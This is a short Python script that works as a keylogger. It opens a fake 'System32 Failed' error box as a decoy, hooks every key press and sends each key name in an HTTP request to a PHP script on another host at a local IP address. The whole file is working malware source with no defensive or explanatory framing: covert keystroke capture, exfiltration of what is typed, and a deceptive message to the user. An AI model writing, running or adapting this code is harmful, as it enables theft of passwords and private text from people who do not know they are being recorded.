import keyboard
import requests
from tkinter import messagebox
from urllib.parse import quote

php_script_url = "http://192.168.1.56/index.php"

messagebox.showerror('System32 Failed', 'Error System32')

print('Started ...')

def on_key_event(e):

    # Gets the type of event (key pressed or released)
    if e.event_type == keyboard.KEY_DOWN:
        
        # Creates a string with the information from the key
        key_info = f"{e.name} "

        # encode key
        key_info_encoded = quote(key_info)
        
        # encode in UTF 8
        url_with_params = f"{php_script_url}?key_info={key_info_encoded}"

        response = requests.get(url_with_params)

        # print(response.text)
        

# Stores callback function for all key events
keyboard.hook(on_key_event)

# Keeps program running
keyboard.wait("esc")  # Stop the program by pressing the "Esc" key
